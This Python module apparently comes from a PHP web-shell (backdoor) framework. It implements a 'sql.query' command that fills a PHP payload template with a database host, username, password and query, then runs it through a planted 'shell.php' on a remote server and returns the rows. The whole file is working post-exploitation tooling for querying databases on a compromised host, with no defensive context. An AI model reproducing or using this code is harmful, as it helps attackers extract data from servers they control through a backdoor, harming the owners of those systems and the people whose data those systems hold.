'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
import random

classname = 'Query'
 

    
class Query(Module):
    '''Execute SQL query
    :sql.query <mysql|pg> <host> <user> <pass> "<query>"
    '''
    
    vectors = VectorList([
            Vector('shell.php', 'mysql', """
            if(@mysql_connect("%s","%s","%s")){
                $result = mysql_query("%s");
                while (list($table) = mysql_fetch_row($result)) {
                        echo $table."\n";
                }
            }
            """)
            ])



    def __init__( self, modhandler , url, password):

        Module.__init__(self, modhandler, url, password)
        
        
    def run( self, mode, host, user, pwd , query ):

        vector = self._get_default_vector2()
        if vector:
            response = self.__execute_payload(vector, [host, user, pwd, query])
            if response != None:
                return response
            
        vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        for vector in vectors:
            response = self.__execute_payload(vector, [host, user, pwd, query])
            if response != None:
                return response
        
    def __execute_payload(self, vector, parameters):
        
        payload = self.__prepare_payload(vector, parameters) 
        
        response = self.modhandler.load(vector.interpreter).run(payload)
        if response:
            return response
        return None


    def __prepare_payload( self, vector, parameters ):

        if vector.payloads[0].count( '%s' ) == len(parameters):
            return vector.payloads[0] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
        



    
    
    